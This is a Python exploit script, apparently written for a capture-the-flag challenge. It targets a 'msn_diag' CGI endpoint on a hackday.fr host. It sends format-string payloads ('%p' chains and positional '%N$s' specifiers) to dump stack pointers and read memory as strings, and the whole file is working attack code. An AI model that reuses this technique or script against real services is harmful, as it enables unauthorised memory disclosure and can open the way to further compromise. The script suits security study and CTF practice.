#!/usr/bin/env python3
import urllib.request
import urllib.parse
import struct
import time

BASE = "http://millenium-messenger.hackday.fr:8000"

def send_msg(body):
    encoded = urllib.parse.quote(body, safe='')
    url = f"{BASE}/cgi-bin/msn_diag?cmd=MSG&body={encoded}"
    with urllib.request.urlopen(url) as resp:
        return resp.read().decode('latin-1')

def extract_diag(text):
    idx = text.find('DIAG ')
    if idx >= 0:
        return text[idx+5:].strip()
    return text

print("--- Dumping stack pointers ---")
# Let's get the first 30 pointers on the stack
res = send_msg(".".join(["%p"] * 30))
ptrs = extract_diag(res).split('.')

for i, p in enumerate(ptrs):
    print(f"Pos {i+1}: {p}")

print("\n--- Reading non-null pointers as strings ---")
for i, p in enumerate(ptrs):
    pos = i + 1
    if p != "(nil)" and "0x" in p:
        # Avoid reading our own buffer (pos 1 or 4) to avoid loops
        if pos in [1, 4]: continue
        
        try:
            res_s = send_msg(f"%{pos}$s")
            s = extract_diag(res_s)
            if s and "(null)" not in s:
                # Limit output to 30 chars for readability
                print(f"Pos {pos} ({p}) string: {repr(s[:50])}")
        except:
            pass
    time.sleep(0.01)
